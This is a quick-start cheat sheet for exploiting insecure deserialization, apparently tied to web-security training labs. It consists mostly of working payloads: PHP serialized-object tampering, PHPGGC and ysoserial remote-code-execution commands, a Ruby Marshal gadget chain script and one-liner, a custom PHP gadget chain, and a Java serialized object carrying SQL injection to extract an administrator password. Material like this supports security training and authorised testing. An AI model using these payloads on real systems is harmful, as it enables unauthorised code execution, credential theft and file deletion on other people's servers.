# Insecure Deserialization - Quick Start Guide

## Rapid Testing and Exploitation Reference

This guide provides streamlined approaches for quickly identifying and exploiting insecure deserialization vulnerabilities.

---

## Quick Identification

### Detecting Serialization Formats

| Language | Magic Bytes (Hex) | Base64 Prefix | Cookie Example |
|----------|-------------------|---------------|----------------|
| **PHP** | N/A (plaintext) | `Tzo`, `Tz` | `O:4:"User":2:{...}` |
| **Java** | `AC ED 00 05` | `rO0` | `rO0ABXNy...` |
| **Ruby** | `04 08` | `BAh`, `BAFF` | `BAhvOh1HZW0...` |
| **.NET** | `00 01 00 00` | `AAEAAA` | `AAEAAAD/////...` |
| **Python pickle** | `80 03` or `80 04` | `gAN`, `gAR` | `gAN9cQBY...` |

### Quick Detection Commands

```bash
# Decode and examine cookie
echo "COOKIE_VALUE" | base64 -d | xxd | head

# Check for Java serialization
echo "rO0ABXNy..." | base64 -d | xxd | head -c 4
# Output: aced 0005 = Java

# Check for Ruby Marshal
echo "BAhvOh..." | base64 -d | xxd | head -c 2
# Output: 0408 = Ruby

# Check for PHP serialization (look for patterns)
echo "TzoxND..." | base64 -d
# Output: O:14:"Class":... = PHP
```

---

## PHP Deserialization - 5 Minute Exploitation

### Lab 1: Basic Privilege Escalation (2-3 min)

**Quick Exploit:**
```bash
# 1. Decode cookie
echo "$COOKIE" | base64 -d

# 2. Change admin value: b:0 → b:1
# 3. Re-encode
echo -n 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64

# 4. Replace cookie and access /admin
```

### Lab 2: Type Juggling (3-5 min)

**Quick Exploit:**
```bash
# Change access token from string to integer 0
# Original: s:32:"abc123..."
# Modified: i:0

# Username: administrator, Token: i:0
echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}' | base64
```

### Lab 4: Object Injection (5-10 min)

**Quick Exploit:**
```php
<?php
echo base64_encode('O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}');
?>
```

### Lab 6: PHPGGC Exploitation (15-20 min)

**Quick Steps:**
```bash
# 1. Identify framework (tamper signature → read error)
# 2. Get secret key from /cgi-bin/phpinfo.php
# 3. Generate payload
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 > payload.txt

# 4. Sign cookie
php -r '$o=file_get_contents("payload.txt");$k="SECRET";echo urlencode("{\"token\":\"$o\",\"sig_hmac_sha1\":\"".hash_hmac("sha1",$o,$k)."\"}");'
```

---

## Java Deserialization - 10 Minute Exploitation

### Lab 5: ysoserial (10-15 min)

**Quick Exploit:**
```bash
# 1. Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 2. Generate payload (Java 16+)
java -jar ysoserial-all.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0

# 3. Replace session cookie (ensure no line breaks!)
# 4. URL-encode and send request
```

**Java 15 and below:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

**Alternative gadget chains to try:**
```bash
# If CommonsCollections4 fails:
CommonsCollections6
CommonsCollections5
CommonsCollections3
CommonsCollections2
```

---

## Ruby Deserialization - 10 Minute Exploitation

### Lab 7: Ruby Gadget Chain (10-15 min)

**Quick Exploit (exploit.rb):**
```ruby
#!/usr/bin/env ruby
require 'base64'

# Universal Ruby 2.x-3.x gadget
stub_spec = Gem::StubSpecification.new
stub_spec.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")

installer_set = Gem::Resolver::InstallerSet.new(:both)
installer_set.instance_variable_set(:@always_install, [stub_spec])

request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, [installer_set])

puts Base64.strict_encode64(Marshal.dump(request_set))
```

**One-liner execution:**
```bash
ruby exploit.rb | xargs -I {} echo "Cookie: session={}"
```

---

## Expert Labs - Speed Run

### Lab 8: PHP Custom Gadget Chain (20-30 min)

**Quick Steps:**
1. Get source: `/cgi-bin/libs/CustomTemplate.php~`, `/cgi-bin/libs/DefaultMap.php~`
2. Identify chain: `__wakeup()` → `__get()` → `call_user_func()`
3. Generate:

```php
<?php
class CustomTemplate { private $default_desc_type; private $desc; public $product; }
class DefaultMap { private $callback; }
class Product { public $desc; }

$exploit = new CustomTemplate();
$map = new DefaultMap();
$product = new Product();

$ref = new ReflectionClass('CustomTemplate');
$ref->getProperty('default_desc_type')->setAccessible(true);
$ref->getProperty('default_desc_type')->setValue($exploit, 'rm /home/carlos/morale.txt');
$ref->getProperty('desc')->setAccessible(true);
$ref->getProperty('desc')->setValue($exploit, $map);

$ref2 = new ReflectionClass('DefaultMap');
$ref2->getProperty('callback')->setAccessible(true);
$ref2->getProperty('callback')->setValue($map, 'exec');

$product->desc = 'test';
$exploit->product = $product;

echo base64_encode(serialize($exploit));
?>
```

### Lab 9: Java SQL Injection (30-45 min)

**Quick Steps:**
1. Get source: `/backup/ProductTemplate.java`
2. Identify SQLi: `String.format("SELECT * FROM products WHERE id = '%s'", id)`
3. Test columns: `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--` (8 columns)
4. Generate payload:

```java
import java.io.*;
import java.util.Base64;

class ProductTemplate implements Serializable {
    private final String id;
    public ProductTemplate(String id) { this.id = id; }
}

public class Exploit {
    public static void main(String[] args) throws Exception {
        ProductTemplate pt = new ProductTemplate("' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users WHERE username='administrator'--");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(pt);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
```

5. Extract password from error message
6. Login and delete carlos

---

## Burp Suite Shortcuts

### Essential Workflow

```
1. Proxy → Intercept login → Capture cookie
2. Inspector → Decode cookie → Identify format
3. Repeater → Send request
4. Decoder → Modify payload → Base64 encode
5. Repeater → Replace cookie → Send
```

### Inspector Panel Tips

- **PHP serialization view:** Automatically parses PHP objects
- **Modify directly:** Change values without manual Base64 encoding
- **Auto-encoding:** Inspector re-encodes automatically

### Decoder Quick Operations

```
Base64 decode: Select text → Decode as → Base64
Base64 encode: Select text → Encode as → Base64
URL encode: Select text → Encode as → URL
Hex view: Select text → View as → Hex
```

---

## Common Pitfalls & Quick Fixes

### Issue: "Invalid signature" error
**Fix:** You need to sign the cookie with HMAC
```bash
# PHP example
php -r 'echo hash_hmac("sha1", "PAYLOAD", "SECRET_KEY");'
```

### Issue: Cookie not working after encoding
**Fix:** Remove line breaks from Base64
```bash
# Ensure single line
base64 -w 0 payload.bin
```

### Issue: Java payload not executing
**Fix 1:** Try different gadget chains (CC4, CC6, CC5)
**Fix 2:** URL-encode the cookie
**Fix 3:** Check Java version requirements

### Issue: PHP serialization length mismatch
**Fix:** Update string lengths
```php
# "administrator" is 13 characters
s:13:"administrator"
# "/home/carlos/morale.txt" is 23 characters
s:23:"/home/carlos/morale.txt"
```

### Issue: Ruby payload not working
**Fix:** Ensure all instance variables are set
```ruby
stub_spec.instance_variable_set(:@loaded_from, "|command")
# Note the pipe character |
```

---

## Speed Testing Checklist

### Initial Reconnaissance (30 seconds)
- [ ] Decode session cookie
- [ ] Identify serialization format
- [ ] Check for magic bytes

### Basic Tests (2-3 minutes)
- [ ] PHP: Modify boolean value
- [ ] Java: Test for `rO0` prefix
- [ ] Ruby: Test for `BAh` prefix

### Intermediate Tests (5-10 minutes)
- [ ] PHP: Test type juggling with `i:0`
- [ ] Find backup files: `*.php~`, `*.java.bak`
- [ ] Check for phpinfo.php

### Advanced Tests (15-30 minutes)
- [ ] Generate ysoserial payload
- [ ] Generate PHPGGC payload
- [ ] Test Ruby Marshal gadget chain

### Expert Tests (30-60 minutes)
- [ ] Analyze source code
- [ ] Build custom gadget chain
- [ ] Combine with SQL injection

---

## One-Liner Exploits

### PHP Type Juggling
```bash
echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}' | base64
```

### PHP File Deletion
```bash
echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}' | base64
```

### Java RCE with ysoserial
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

### Ruby RCE
```bash
ruby -e 'require"base64";s=Gem::StubSpecification.new;s.instance_variable_set(:@loaded_from,"|rm /home/carlos/morale.txt");i=Gem::Resolver::InstallerSet.new(:both);i.instance_variable_set(:@always_install,[s]);r=Gem::RequestSet.new;r.instance_variable_set(:@sets,[i]);puts Base64.strict_encode64(Marshal.dump(r))'
```

---

## Lab Completion Times (Speed Run)

| Lab | Min Time | Average | With Tools |
|-----|----------|---------|------------|
| Lab 1 | 2 min | 10 min | 2 min |
| Lab 2 | 3 min | 15 min | 3 min |
| Lab 3 | 5 min | 20 min | 5 min |
| Lab 4 | 5 min | 25 min | 7 min |
| Lab 5 | 10 min | 35 min | 12 min |
| Lab 6 | 15 min | 50 min | 20 min |
| Lab 7 | 10 min | 35 min | 12 min |
| Lab 8 | 20 min | 75 min | 25 min |
| Lab 9 | 30 min | 105 min | 40 min |

---

## Emergency Cheat Commands

### Identify Serialization
```bash
# Quick check
echo "$COOKIE" | base64 -d | strings | head
```

### PHP Quick Modify
```bash
# Decode, edit in vim, re-encode
echo "$COOKIE" | base64 -d > /tmp/payload
vim /tmp/payload  # Edit the payload
cat /tmp/payload | base64 -w 0
```

### Java Quick Test
```bash
# Test if Java deserialization is working
echo "$COOKIE" | base64 -d | xxd | grep aced
```

### Ruby Quick Test
```bash
# Test if Ruby Marshal is working
echo "$COOKIE" | base64 -d | xxd | head -c 2 | grep 0408
```

---

## Quick Reference: Dangerous Functions

### PHP
```php
unserialize()           // Entry point
call_user_func()        // Code execution
eval()                  // Direct RCE
system(), exec()        // Command execution
include(), require()    // File inclusion
file_get_contents()     // File reading
unlink()               // File deletion
```

### Java
```java
ObjectInputStream.readObject()  // Entry point
Runtime.exec()                  // Command execution
ProcessBuilder.start()          // Process execution
ScriptEngine.eval()             // Code execution
```

### Ruby
```ruby
Marshal.load()          // Entry point
Kernel.load()           // Can execute commands with "|"
eval()                  // Code execution
system()               // Command execution
```

---

## Testing Priority Order

### 1. Quick Wins (5 minutes)
1. PHP boolean flip
2. PHP type juggling
3. Check for phpinfo.php

### 2. Pre-built Gadgets (15 minutes)
1. ysoserial for Java
2. PHPGGC for PHP frameworks
3. Ruby documented exploits

### 3. Custom Development (60+ minutes)
1. Source code analysis
2. Gadget chain construction
3. Combined exploitation (SQLi + deser)

---

## Tool Installation (One-Time Setup)

```bash
# Create tools directory
mkdir ~/deserialization-tools
cd ~/deserialization-tools

# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Install PHPGGC
git clone https://github.com/ambionics/phpggc.git
cd phpggc
chmod +x phpggc

# Add to PATH (optional)
echo 'export PATH=$PATH:~/deserialization-tools/phpggc' >> ~/.bashrc
echo 'alias ysoserial="java -jar ~/deserialization-tools/ysoserial-all.jar"' >> ~/.bashrc
source ~/.bashrc
```

---

## Final Tips for Speed

1. **Use Burp Inspector** - Fastest way to modify PHP/Java serialized objects
2. **Keep payloads handy** - Save successful exploits for reuse
3. **Automate encoding** - Create bash aliases for common operations
4. **Parallel testing** - Test multiple approaches simultaneously
5. **Read error messages** - They often contain useful information
6. **Check documentation first** - Don't reinvent documented exploits
7. **Practice lab repetition** - Speed comes from familiarity
8. **Use tab completion** - Saves time typing long commands
9. **Master your text editor** - Quick editing is essential
10. **Keep tools updated** - Latest versions have more gadget chains

---

*Master these techniques to efficiently identify and exploit insecure deserialization vulnerabilities in penetration testing engagements.*
